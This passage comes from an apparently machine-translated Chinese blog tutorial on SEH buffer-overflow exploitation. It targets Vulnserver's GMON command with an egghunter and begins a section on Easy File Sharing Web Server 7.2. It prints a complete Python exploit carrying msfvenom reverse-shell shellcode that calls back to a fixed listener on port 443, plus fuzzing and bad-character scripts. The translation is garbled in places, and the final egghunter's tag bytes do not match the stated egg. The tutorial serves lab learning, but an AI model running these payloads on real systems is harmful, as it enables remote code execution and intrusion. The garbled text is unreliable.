Handler</strong><code>Shift+F9</code>的值发送到<strong>EIP寄存器</strong>，<strong>EIP寄存器</strong>将依次跳转按照我们的指示。<code>POP POP RET</code></p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191115162422.png" class="lozad"></p><p>完善！正是我们所需要的，将我们的<strong>SE Handler</strong>值<code>625010B4</code>in推送到<code>EIP</code>了我们的<code>POP POP RET</code>说明中，如左上方所示。</p><p>现在，如果我们通过按逐步操作<code>F7</code>，则将首先进行操作<code>POP EBX</code> <code>POP EBP</code>，最后进行操作<code>RETN</code>，这将使我们达到<strong>nSEH</strong>的值-在这种情况下<code>BBBB</code></p><p>只是为了更详细地解释这里发生了什么</p><ul><li><strong>POP EBX</strong> - <em>POP的</em>栈顶到<strong>EBX注册</strong> - <strong>7DEB6AB9</strong></li><li><strong>POP EBP</strong> - <em>POP的</em>栈顶到<strong>EBP注册</strong> - <strong>0237ED34</strong></li><li><strong>RETN</strong> - <em>返回</em> /堆栈的顶部为推动价值<strong>EIP寄存器</strong> - <strong>0237FFC4</strong></li></ul><p>现在您可能会注意到<strong>0237FFC4</strong>看起来很熟悉，如果再次查看<strong>SEH Chain</strong>，我们将看到<strong>0237FFC4</strong>对应于<strong>nSEH</strong></p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191115162431.png" class="lozad"></p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191115162442.png" class="lozad"></p><p>如您所见，<strong>EIP</strong>点也<code>024FFFC4</code>与左上方的指令相关，查看这些指令，我们可以看到“ 42 42 42 42 <code>which represents our</code>“ B” * 4”。</p><h3 id="2-1-5-生成Egghunter"><a href="#2-1-5-生成Egghunter" class="headerlink" title="2.1.5 生成Egghunter"></a>2.1.5 生成Egghunter</h3><p>正如我已经谈到了为什么使用Egghunter以及它们如何工作一样，我将直接进入它，首先让我们分析堆栈以及在这里使用什么。</p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191115162451.png" class="lozad"></p><p>如前所述，需要<strong>3515字节</strong>来获取太<strong>nSEH，</strong>而需要<strong>3519字节</strong>来覆盖指向<strong>SE处理程序</strong>的指针，之后我们有<strong>52字节</strong>的空间，在这种情况下，由<code>DDDDD...</code>- 表示：-当然52字节对于我们的<em>shellcode</em>来说不是足够的空间，但是对于Egghunter来说已经足够了，因为我们只需要<strong>32个字节</strong> - 只要我们可以使用相关的Egghunter <em>标签</em>通过其他方式将shellcode放入内存，我们就应该能够执行。</p><p>像往常一样，由于简单，我将在此阶段使用<strong>mona</strong>来帮助我。</p><p><strong>使用Mona生成Egghunter</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">!mona egg -t MOCH</span><br></pre></td></tr></table></figure><p>默认情况下，<strong>mona</strong>会生成一个带有默认标签的Egghunter，它的默认标签<code>w00t</code>可以很好地工作，但是在这里我选择指定一个自定义标签<code>MOCH</code></p><p>完美，现在让我们将其添加到我们的利用脚本中</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">egghunter = (&quot;\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xcd\x2e\x3c\x05\x5a\x74&quot;</span><br><span class="line">&quot;\xef\xb8\x4d\x4f\x43\x48\x8b\xfa\xaf\x75\xea\xaf\x75\xe7\xff\xe7&quot;)</span><br></pre></td></tr></table></figure><p>值得注意的是，Egghunters也应检查以前发现的不良字符。</p><p>我们还将<code>tag</code>在变量<strong>TWICE中</strong>定义变量，以便Egghunter在执行和搜索内存时不会发现自己。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">egg = &apos;MOCHMOCH&apos;</span><br></pre></td></tr></table></figure><p>我还将花时间<code>junk</code>用</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">buffer += egghunter</span><br><span class="line">junk = &quot;D&quot;*(5000-len(buffer))</span><br><span class="line">buffer += junk #Bunch of D&quot;s to fill remaining space</span><br></pre></td></tr></table></figure><p>这将允许我们在<strong>SEH</strong>之后直接添加Egghunter shell代码，然后添加一堆D来填充剩余空间，以防万一。</p><p>现在让我们生成一些shell代码，对整体漏洞进行最后调整，然后尝试一下。</p><h3 id="2-1-6-跳到Egghunter"><a href="#2-1-6-跳到Egghunter" class="headerlink" title="2.1.6 跳到Egghunter"></a>2.1.6 跳到Egghunter</h3><p>现在只是重申此处的目的是<strong>超速**</strong>SEH<strong>，执行一个<code>POP POP RET</code>序列，该序列</strong>又将nSEH<strong>的值</strong>压<strong>入</strong>EIP寄存器** -在这种情况下，我们希望将Egghunter的地址放在<strong>nSEH之上</strong>或以某种形式的指令将使我们跳入我们的Egghunter shellcode，再次，如果我们检查堆栈，我们会发现我们走得太远。</p><h3 id="2-1-7-生成Shellcode和最终利用"><a href="#2-1-7-生成Shellcode和最终利用" class="headerlink" title="2.1.7 生成Shellcode和最终利用"></a>2.1.7 生成Shellcode和最终利用</h3><p>一如既往，我将在这里使用MSFVenom生成一些shellcode，因为我们并不是真正在与高级防病毒软件或任何其他工具作斗争，所以不必花哨，我们只需使用下面的代码即可。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">m0chan@kali:/&gt; msfvenom -p windows/shell_reverse_tcp LHOST=172.16.10.171 LPORT=443 EXITFUNC=thread -f c -a x86 --platform windows -b &quot;\x00&quot;</span><br></pre></td></tr></table></figure><p>现在生成了很棒的shell代码，我们只是将其弹出到最终的利用中。</p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191115162511.png" class="lozad"></p><p>在这种情况下，你可以看到我们会从内存地址跳转<strong>0237FFC4</strong>到<strong>0237FFCC</strong>这将是在那里我们Egghunter会坐下。</p><p>现在在这里，我们只是用<strong>0237FFCC</strong>覆盖<strong>nSEH</strong>的地址，但是就像我说的那样，它不是很实用，并且最好做一个简单的短跳转（也称为操作码）-但是有一个小的变化。该指令只有<strong>2个字节</strong>，<strong>nSEH</strong>需要<strong>4个字节。</strong><code>EB``EB</code></p><p>这不是一个大问题，因为我们可以简单地使用<code>NOPS</code>aka，<code>\x90</code>所以我们在这里要做的是填充<strong>nSEH</strong>，<code>\x90\x90</code>这意味着<strong>2/4个字节</strong>已满，然后是代表跳转6个字节的<code>EB</code>指令<code>\xeb\x06</code>。现在，<strong>nSEH</strong>中填充了<strong>4/4个字节</strong></p><p>我们利用现在技术上跳<strong>8个字节</strong>，但我们只需要跳<strong>6个字节</strong>，因为我们<em>真的</em>只是<em>滑动</em>下来<strong>NOPS</strong>所以6个字节是所有的需要。</p><p>太好了，现在在漏洞利用程序中更新<strong>nSEH</strong>变量以反映以下内容</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nseh = &quot;\xeb\x06\x90\x90&quot;</span><br></pre></td></tr></table></figure><p>当然，<strong>little endian</strong>再次是相反顺序的原因。</p><p><strong>最终利用</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python</span><br><span class="line">import socket</span><br><span class="line">import sys</span><br><span class="line"></span><br><span class="line">#Vulnserver GMON SEH Overflow w/ Egghunter</span><br><span class="line">#Author: m0chan</span><br><span class="line">#Date: 28/08/2019</span><br><span class="line"></span><br><span class="line">nseh = &quot;\xeb\x06\x90\x90&quot; #0x909006be - nop,nop,jump 6 bytes with EB into egghunter</span><br><span class="line">seh = &quot;\xb4\x10\x50\x62&quot; #0x625010br pop,pop,ret</span><br><span class="line"></span><br><span class="line">eggnops = &quot;\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span><br><span class="line"></span><br><span class="line">egghunter = (</span><br><span class="line">&quot;\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xcd\x2e\x3c\x05\x5a\x74&quot;</span><br><span class="line">&quot;\xef\xb8\x74\x65\x65\x74\x8b\xfa\xaf\x75\xea\xaf\x75\xe7\xff\xe7&quot;)</span><br><span class="line"></span><br><span class="line">egg = &apos;MOCHMOCH&apos;</span><br><span class="line"></span><br><span class="line">#msfvenom -p windows/shell_reverse_tcp LHOST=172.16.10.171 LPORT=443 -e x86/shikata_ga_nai EXITFUNC=thread -f c -a x86 --platform windows -b &quot;\x00\x80\x0a\x0c\x0d&quot;</span><br><span class="line"></span><br><span class="line">shellcode = (</span><br><span class="line">&quot;\xda\xc4\xbf\xcf\xa2\xc0\xf1\xd9\x74\x24\xf4\x5b\x2b\xc9\xb1&quot;</span><br><span class="line">&quot;\x52\x83\xeb\xfc\x31\x7b\x13\x03\xb4\xb1\x22\x04\xb6\x5e\x20&quot;</span><br><span class="line">&quot;\xe7\x46\x9f\x45\x61\xa3\xae\x45\x15\xa0\x81\x75\x5d\xe4\x2d&quot;</span><br><span class="line">&quot;\xfd\x33\x1c\xa5\x73\x9c\x13\x0e\x39\xfa\x1a\x8f\x12\x3e\x3d&quot;</span><br><span class="line">&quot;\x13\x69\x13\x9d\x2a\xa2\x66\xdc\x6b\xdf\x8b\x8c\x24\xab\x3e&quot;</span><br><span class="line">&quot;\x20\x40\xe1\x82\xcb\x1a\xe7\x82\x28\xea\x06\xa2\xff\x60\x51&quot;</span><br><span class="line">&quot;\x64\xfe\xa5\xe9\x2d\x18\xa9\xd4\xe4\x93\x19\xa2\xf6\x75\x50&quot;</span><br><span class="line">&quot;\x4b\x54\xb8\x5c\xbe\xa4\xfd\x5b\x21\xd3\xf7\x9f\xdc\xe4\xcc&quot;</span><br><span class="line">&quot;\xe2\x3a\x60\xd6\x45\xc8\xd2\x32\x77\x1d\x84\xb1\x7b\xea\xc2&quot;</span><br><span class="line">&quot;\x9d\x9f\xed\x07\x96\xa4\x66\xa6\x78\x2d\x3c\x8d\x5c\x75\xe6&quot;</span><br><span class="line">&quot;\xac\xc5\xd3\x49\xd0\x15\xbc\x36\x74\x5e\x51\x22\x05\x3d\x3e&quot;</span><br><span class="line">&quot;\x87\x24\xbd\xbe\x8f\x3f\xce\x8c\x10\x94\x58\xbd\xd9\x32\x9f&quot;</span><br><span class="line">&quot;\xc2\xf3\x83\x0f\x3d\xfc\xf3\x06\xfa\xa8\xa3\x30\x2b\xd1\x2f&quot;</span><br><span class="line">&quot;\xc0\xd4\x04\xff\x90\x7a\xf7\x40\x40\x3b\xa7\x28\x8a\xb4\x98&quot;</span><br><span class="line">&quot;\x49\xb5\x1e\xb1\xe0\x4c\xc9\x12\xe4\x44\xa2\x03\x07\x58\xb5&quot;</span><br><span class="line">&quot;\x68\x8e\xbe\xdf\x9e\xc7\x69\x48\x06\x42\xe1\xe9\xc7\x58\x8c&quot;</span><br><span class="line">&quot;\x2a\x43\x6f\x71\xe4\xa4\x1a\x61\x91\x44\x51\xdb\x34\x5a\x4f&quot;</span><br><span class="line">&quot;\x73\xda\xc9\x14\x83\x95\xf1\x82\xd4\xf2\xc4\xda\xb0\xee\x7f&quot;</span><br><span class="line">&quot;\x75\xa6\xf2\xe6\xbe\x62\x29\xdb\x41\x6b\xbc\x67\x66\x7b\x78&quot;</span><br><span class="line">&quot;\x67\x22\x2f\xd4\x3e\xfc\x99\x92\xe8\x4e\x73\x4d\x46\x19\x13&quot;</span><br><span class="line">&quot;\x08\xa4\x9a\x65\x15\xe1\x6c\x89\xa4\x5c\x29\xb6\x09\x09\xbd&quot;</span><br><span class="line">&quot;\xcf\x77\xa9\x42\x1a\x3c\xc9\xa0\x8e\x49\x62\x7d\x5b\xf0\xef&quot;</span><br><span class="line">&quot;\x7e\xb6\x37\x16\xfd\x32\xc8\xed\x1d\x37\xcd\xaa\x99\xa4\xbf&quot;</span><br><span class="line">&quot;\xa3\x4f\xca\x6c\xc3\x45&quot;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">buffer = &quot;A&quot; * (3515-len(egg + shellcode))</span><br><span class="line">print &quot;[*] Adding Egghunter tag &quot; + egg + &quot; alongside A Buffer&quot;</span><br><span class="line">buffer += egg</span><br><span class="line">buffer += shellcode</span><br><span class="line">print &quot;[*] Starting to Fuzz GMON with %s bytes&quot; %len(buffer) + &quot; A&apos;s&quot;</span><br><span class="line">buffer += nseh</span><br><span class="line">print &quot;[*] Overwriting nSEH Value with &quot; + nseh</span><br><span class="line">buffer += seh #0x625010br pop,pop,ret</span><br><span class="line">print &quot;[*] Overwriting SEH Value with &quot; + seh</span><br><span class="line">buffer += eggnops</span><br><span class="line">buffer += egghunter</span><br><span class="line">junk = &quot;J&quot;*(5000-len(buffer))</span><br><span class="line">buffer += junk #Bunch of D&quot;s to fill remaining space</span><br><span class="line"></span><br><span class="line">print &quot;[*] Starting to Fuzz GMON with everything containing %s bytes&quot; %len(buffer)</span><br><span class="line">s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">connect=s.connect((&apos;bof.local&apos;,9999))</span><br><span class="line">print &quot;[*] Connected to bof.local on Port 9999&quot;</span><br><span class="line">s.send((&apos;GMON /.:/&apos; + buffer))</span><br><span class="line">s.close()</span><br><span class="line">print &quot;[*] Finished Fuzzing GMON with %s bytes&quot; %len(buffer)</span><br></pre></td></tr></table></figure><p><code>443</code>假设我们有一个打开的监听器，我们将收到一个反向外壳-在这里值得注意的是，这<strong>只能</strong>在<code>Windows 7 x86</code>此工作是由于Egghunter启动系统调用的方式，即<code>INT 2E</code>-整个体系结构稍有不同，因此我们的<strong>mona</strong> Egghunter将仅在 <code>32 Bit</code></p><p>我决定创建此小图来从较高的角度表示漏洞，并尝试显示每个相关的跳转-我的visio技能不是很好，所以请问！</p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191115162523.png" class="lozad"></p><h2 id="2-2-无需Egghunter的轻松文件共享Web服务器7-2"><a href="#2-2-无需Egghunter的轻松文件共享Web服务器7-2" class="headerlink" title="2.2 无需Egghunter的轻松文件共享Web服务器7.2"></a>2.2 无需Egghunter的轻松文件共享Web服务器7.2</h2><p>轻松文件共享Web服务器是Win XP / Win 7时代的遗留软件，它使访问者可以轻松地通过选择的Web浏览器轻松上传/下载文件，尽管它在被<strong>Stack Overflows</strong>充斥着众多漏洞时非常有用到<strong>SEH溢出</strong>。</p><h3 id="2-2-1-模糊和发现崩溃"><a href="#2-2-1-模糊和发现崩溃" class="headerlink" title="2.2.1 模糊和发现崩溃"></a>2.2.1 模糊和发现崩溃</h3><p>与之前的示例类似，我将<em>停留</em>在<em>模糊测试</em>阶段，因为我不想花费大量时间对每个输入/参数进行模糊测试，也就是说，在此示例中，我们将以<strong>HTTP</strong>协议为目标并<code>boozfuzz</code>支持<strong>HTTP</strong>模糊测试，因此请检查一下！我很快将只写一篇关于模糊测试和不同技术的文章。</p><p>由于该漏洞位于<strong>HTTP中，</strong>因此有几种方法可以使用python做到这一点，我们可以使用该<code>requests</code>库，也可以仅通过端口80连接并发送原始<strong>HTTP请求。</strong>-我将在此处输入Port 80 / Raw Requests，并可能<code>requests</code>在最后重写脚本。</p><p>首先让我们从一个基本的FUZZ脚本开始，直到发生崩溃为止，这里的漏洞位于<code>GET</code>变量内部，底层应用程序试图在其中获取传递的输入内容，<code>GET</code>并且无法进行边界检查和任何清理等操作。</p><p>这是一个示例示例，我们将使用python发送HTTP请求</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">GET /m0chan.txtAAAAAAAAAbufferhereAAAAAAA HTTP/1.1</span><br><span class="line">Host: 172.16.10.15</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.92 Safari/537.36</span><br><span class="line">Accept:text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: en-US,en;q=0.9</span><br><span class="line">Cookie: SESSIONID=5905; UserID=; PassWD=</span><br><span class="line">If-Modified-Since: Fri, 11 May 2012 10:11:48 GMT</span><br><span class="line">Connection: close</span><br></pre></td></tr></table></figure><p>正如您在<strong>第1行上</strong>看到的那样，我们正在请求<code>m0chan.txt</code>旁边的缓冲区/图案。-让我们快速编写一些python脚本以使其变得更简单。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python</span><br><span class="line">import socket</span><br><span class="line">import sys</span><br><span class="line">import string</span><br><span class="line"></span><br><span class="line">buffer = &quot;A&quot; * 5000</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload = &quot;GET %d&quot; + str(buffer) + &quot; HTTP/1.1\r\n&quot;</span><br><span class="line">payload += &quot;Host: bof.local\r\n&quot;</span><br><span class="line">payload += &quot;User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.92 Safari/537.36\r\n&quot;</span><br><span class="line">payload += &quot;Accept:text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8&quot;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">print &quot;[*] Starting to Fuzz GET Variable with %s bytes&quot; %len(payload)</span><br><span class="line">s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">connect=s.connect((&apos;bof.local&apos;,80))</span><br><span class="line">print &quot;[*] Connected to bof.local on Port 80&quot;</span><br><span class="line">s.send((payload))</span><br><span class="line">s.close()</span><br><span class="line">print &quot;[*] Finished Fuzzing GET Variable with %s bytes&quot; %len(payload)</span><br></pre></td></tr></table></figure><p>一旦完成运行（只要我们已<code>EFSWS</code>打开<strong>Immunity</strong>和/或连接），我们就会注意到我们实际上造成了崩溃，让我们分析下面的屏幕截图，看看我们做了什么。</p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191115162544.png" class="lozad"></p><p>如您所见，在这种情况下，我们已经用用户提供的输入超出了<strong>nSEH</strong>和<strong>SEH</strong>的地址<code>AAAA</code> <code>41414141</code>-我们也对我们有些新的限制… <strong>EAX寄存器</strong> -如您所见，右上方<code>EAX</code>包含的<code>41414141</code>是我们的<code>A</code>缓冲区。-稍后可能会有用。</p><h3 id="2-2-2-寻找偏移"><a href="#2-2-2-寻找偏移" class="headerlink" title="2.2.2 寻找偏移"></a>2.2.2 寻找偏移</h3><p>现在，我们已经分析了崩溃并找到了<em>漏洞，</em>我们可以继续计算偏移量，并计算出使<code>A&#39;s</code>我们超出<strong>SEH</strong>和<strong>nSEH</strong>指针所需的时间。为此，我将通过以下命令使用<strong>mona</strong>来计算非重复字符串（也称为<strong>循环模式）</strong>。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">!mona pc 5000</span><br></pre></td></tr></table></figure><p>现在，我将<code>fuzzer.py</code>再次使用我的脚本并将其修改为发送我的模式<code>5000</code> <code>A&#39;s</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python</span><br><span class="line">import socket</span><br><span class="line">import sys</span><br><span class="line">import string</span><br><span class="line"></span><br><span class="line">buffer = &quot;Aa0Aa1Aa2Aa3Aa4Aa5Aa6....&quot;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload = &quot;GET %d&quot; + str(buffer) + &quot; HTTP/1.1\r\n&quot;</span><br><span class="line">payload += &quot;Host: bof.local\r\n&quot;</span><br><span class="line">payload += &quot;User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.92 Safari/537.36\r\n&quot;</span><br><span class="line">payload += &quot;Accept:text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8&quot;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">print &quot;[*] Starting to Fuzz GET Variable with %s bytes&quot; %len(payload)</span><br><span class="line">s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">connect=s.connect((&apos;bof.local&apos;,80))</span><br><span class="line">print &quot;[*] Connected to bof.local on Port 80&quot;</span><br><span class="line">s.send((payload))</span><br><span class="line">s.close()</span><br><span class="line">print &quot;[*] Finished Fuzzing GET Variable with %s bytes&quot; %len(payload)</span><br></pre></td></tr></table></figure><p>我们的应用程序现在将返回崩溃状态并报告<strong>访问冲突，</strong>但是如果我们检查<strong>SEH Chain</strong>并跳转到堆栈上的<strong>SE Handler</strong>的值，我们将注意到它实际上已经超出了我们的循环模式，而不是一长串<code>A&#39;s</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">!mona findmsp</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">!mona po 3Ff4</span><br></pre></td></tr></table></figure><p>运行以上任一命令都将报告，超出<strong>nSEH</strong>值的偏移量是<strong>4061字节</strong> -我们现在可以修改漏洞利用以反映<code>&quot;A&quot; * 4061</code></p><p><img alt="img" data-src="https://i.imgur.com/KTyiqOU.png" class="lozad"></p><h3 id="2-2-3-寻找坏字符"><a href="#2-2-3-寻找坏字符" class="headerlink" title="2.2.3 寻找坏字符"></a>2.2.3 寻找坏字符</h3><p>在这里，我们将采用与上述相同的方法，在该方法中，我们将每个可能的字符发送到缓冲区旁边，并分析它们在内存转储中的显示方式-在此还值得注意的是，我们必须为<code>\n</code>＆排除字符，<code>\r</code>因为我们没有希望在我们的缓冲区旁边发送装盒返回和新行，以有效地分解原始<strong>HTTP请求</strong>。</p><p>我将在此处使用以下脚本。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python</span><br><span class="line">import socket</span><br><span class="line">import sys</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">nseh = &quot;B&quot;*4</span><br><span class="line">seh = &quot;C&quot;*4</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">badchars = (&quot;\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f&quot;</span><br><span class="line">&quot;\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40&quot;</span><br><span class="line">&quot;\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f&quot;</span><br><span class="line">&quot;\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f&quot;</span><br><span class="line">&quot;\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f&quot;</span><br><span class="line">&quot;\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf&quot;</span><br><span class="line">&quot;\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf&quot;</span><br><span class="line">&quot;\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff&quot;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">buffer = &quot;A&quot; * (4061-len(badchars))</span><br><span class="line">print &quot;[*] There are %s&quot; %len(badchars) + &quot; bad chars to test&quot;</span><br><span class="line">print &quot;[*] Starting to GET Variable&quot;</span><br><span class="line">buffer += badchars #All of badchars</span><br><span class="line">buffer += nseh #BBBB</span><br><span class="line">buffer += seh #CCCC</span><br><span class="line">junk = &quot;D&quot;*(5000-len(buffer))</span><br><span class="line">buffer += junk #Bunch of D&quot;s to fill remaining space</span><br><span class="line"></span><br><span class="line">payload = &quot;GET %d&quot; + str(buffer) + &quot; HTTP/1.1\r\n&quot;</span><br><span class="line">payload += &quot;Host: bof.local\r\n&quot;</span><br><span class="line">payload += &quot;User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.92 Safari/537.36\r\n&quot;</span><br><span class="line">payload += &quot;Accept:text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8&quot;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">print &quot;[*] Starting to Fuzz GET Variable with %s bytes&quot; %len(payload)</span><br><span class="line">s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">connect=s.connect((&apos;bof.local&apos;,80))</span><br><span class="line">print &quot;[*] Connected to bof.local on Port 80&quot;</span><br><span class="line">s.send((payload))</span><br><span class="line">s.close()</span><br><span class="line">print &quot;[*] Finished Fuzzing GET Variable with %s bytes&quot; %len(payload)</span><br></pre></td></tr></table></figure><p>假设我们反复冲洗并找到内存转储中的所有无效字符，我们将找到所需的东西，在这种情况下，我的发现是</p><figure 